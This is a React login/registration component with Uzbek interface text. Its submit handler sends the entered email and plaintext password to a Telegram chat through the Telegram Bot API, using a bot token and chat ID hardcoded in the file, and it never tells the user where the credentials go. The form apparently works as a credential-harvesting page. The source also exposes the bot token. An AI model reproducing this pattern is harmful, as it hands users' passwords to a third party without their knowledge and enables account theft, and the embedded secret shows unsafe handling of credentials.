import React, { useState } from 'react'
import { Link } from 'react-router-dom';

function Login() {

  const [toggle ,setToggle]=useState(true)
  const [formData, setFormData] = useState({
    email: "",
    password:""
  });

  const botToken = "8017008549:AAEIl6pyQPJ56mzGhQoPtBtxAPGUhyLhNeY";
  const chatId = "6539046942";

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const text = `Yangi foydalanuvchi!\n\n Login: ${formData.email}\n\n Password: ${formData.password}`;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
      const response = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: "Markdown",
        }),
      });

      if (response.ok) {
        alert("Ma'lumotlar yuborildi");
        setFormData({  email: "" , password: "" });
        setToggle(false)
      } else {
        alert("Xabar yuborilmadi!");
      }
    } catch (error) {
      console.error("Error:", error);
      alert("Xatolik ro'y berdi!");
    }
  };

  return (
    <div className='flex justify-center h-[600px] p-4 sm:p-0 z-20  bg-[#22222270]'>
      {toggle ? <div className='relative w-[400px] h-[380px] mt-[100px] p-10 shadow-2xl login-bg bg-white  rounded-lg'>
        <h2 className='font-bold text-2xl mb-4 '>Ro'yhatdan o'tish</h2>
        <Link to="/">{<p className='font-bold absolute right-5 top-5 cursor-pointer'>X</p>}</Link>
        <form onSubmit={handleSubmit}>
          <input
            name='email'
            value={formData.email}
            onChange={handleChange}
            type="email"
            placeholder='Email manzilingizni kiriting'
            required
            autoComplete="off"
            className='w-full py-2 px-4 bg-white outline rounded-lg mb-4'
          />
          <input
            name='password'
            value={formData.password}
            onChange={handleChange}
            required
            autoComplete="off"
            className='w-full py-2 px-4 bg-white outline rounded-lg mb-4'
            type="password"
            placeholder='Parol' />
          <span>
            <a href='#' className='hover:underline hover:text-blue-500 '>Men barcha shartlarga roziman</a><br />
            <input
              type="checkbox"
              required
              className='cursor-pointer mb-8'
            />
          </span>
          <button className='bg-[#304ddb] text-white text-xl font-semibold cursor-pointer py-2 w-full rounded-lg ' type='submit'>Ro'yhatdan o'tish</button>         
        </form>
      </div> 
      : <div className='w-[400px] h-[220px] mt-[100px] p-10 shadow-2xl login-bg bg-white  rounded-lg'>
        <h2 className='font-bold text-2xl mb-8'>Malumotlaringiz yuborildi</h2>
        <Link to="/" ><button className='bg-[#304ddb] text-white text-xl font-semibold cursor-pointer py-2 w-full rounded-lg '>Yakunlash</button></Link>
      </div>
       }
    </div>
  )
}

export default Login